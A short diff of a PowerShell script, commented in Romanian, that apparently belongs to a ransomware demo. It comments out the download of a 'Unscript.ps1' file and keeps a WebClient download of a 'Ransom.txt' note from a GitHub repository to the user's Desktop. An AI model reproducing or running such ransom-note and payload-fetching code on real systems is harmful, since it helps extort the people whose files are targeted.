@@ -140,10 +140,10 @@ foreach ($file in $files1) {
 }
 
 # Descarca fisierul Unscript.ps1
-$url = "https://raw.githubusercontent.com/wbtlgn/Demo/main/Unscript.ps1"
-$output = "$env:USERPROFILE\Desktop\Unscript.ps1"
-$webClient = New-Object System.Net.WebClient
-$webClient.DownloadFile($url, $output)
+# $url = "https://raw.githubusercontent.com/wbtlgn/Demo/main/Unscript.ps1"
+# $output = "$env:USERPROFILE\Desktop\Unscript.ps1"
+# $webClient = New-Object System.Net.WebClient
+# $webClient.DownloadFile($url, $output)
 
 # Descarca fisierul "Ransom.txt"
 $url = "https://raw.githubusercontent.com/wbtlgn/Demo/main/Ransom.txt"
